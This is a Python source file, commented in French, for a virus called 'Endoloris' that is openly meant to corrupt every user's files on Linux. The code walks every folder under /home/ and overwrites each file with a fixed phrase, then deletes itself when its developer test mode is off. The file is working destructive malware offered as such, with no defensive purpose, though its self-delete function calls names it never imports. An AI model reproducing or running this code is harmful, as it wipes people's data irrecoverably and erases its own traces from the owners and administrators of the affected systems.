#Ce fichier va servir à déposer une copie dans la racine.
import os  
from os.path import isfile, join
import shutil
import platform


"""
-------- Endoloris --------
Endoloris est un programme
qui corrompt tout les
fichiers des utilisateurs.
Ce virus est fonctionel que
pour les système Linux. Mais
il est possible de le modifier
pour Windows où autre.  

"""


class MAIN():
    os = "Linux";
    mode_developpeur = True; # Le mode developpeur sert à tester le virus dans un répertoire définit dans la varriable path_safe
    path_safe = "/home/ixem/Documents/Python/Malware/emu/"
    phrase = "Moi j'aime le piment d'espelette"



def src_direc(path):
    #Ici on s'occupe de trouver tous les enfants a partir du parents : path
    for element in os.listdir(path):
        if isfile(join(path,element)):
        # Si c'est un fichier qui est détecté
            if element != "Endoloris.py" :
                #On remplace l'encodage du fichier par le contenu de la varriable MAIN.phrase.
                try:
                    File = open(join(path,element), "wb+")
                    File.write(str.encode(MAIN.phrase))
                    File.close()
                except PermissionError:
                    pass
        else:
            # Si c'est un dossier qui est détecté
            src_direc(join(path,element))

def auto_Destroy():
    for f in listdir(getcwd()):
        remove(join(getcwd(),"Endoloris.py"))
        return


def foreach_racine():
    # Enssuite on regarde si on est sur Linux ou pas.
    # Si Linux, on va dans home et pour chaque user, on va se balader dans chaque dossier.
    
    if MAIN.os == "Linux":
        session = []

        #On change la liste pour évité de suprimé l'ordi ^^
        if MAIN.mode_developpeur:
            path_racine = MAIN.path_safe
        else:
            path_racine = "/home/"


        # On récupère tout les utilisateurs dans la liste session
        for f in os.listdir(path_racine):
            session.append(f)


        for user in session:
            pathUser = join(path_racine,user)
            for d in os.listdir(pathUser):
                src_direc(f"{pathUser}/"+d)

        if(MAIN.mode_developpeur == False):
            auto_Destroy()

foreach_racine()
